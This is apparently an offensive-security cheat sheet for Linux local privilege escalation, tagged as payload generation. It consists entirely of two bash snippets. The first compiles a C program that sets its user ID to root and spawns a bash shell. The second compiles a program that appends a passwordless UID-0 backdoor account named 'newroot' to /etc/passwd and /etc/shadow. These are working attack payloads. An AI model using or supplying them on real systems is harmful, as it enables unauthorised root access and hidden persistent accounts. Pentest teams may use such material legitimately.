# C
% c, shell

## generate shell bash bin
#plateform/linux #target/local  #cat/CODE/SAMPLE #cat/ATTACK/GENERATE_PAYLOAD 

```bash
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c;
gcc pwn.c -o <filename|shell>;
rm pwn.c
```

## add root user
#plateform/linux #target/local  #cat/CODE/SAMPLE #cat/ATTACK/GENERATE_PAYLOAD 

```bash
echo 'int main() {system("echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd");system("echo 'newroot::18133:0:99999:7:::' >> /etc/shadow");printf("User added.\n");return 0;}' > newroot.c;
gcc newroot.c -o <filename|shell>;
rm newroot.c
```
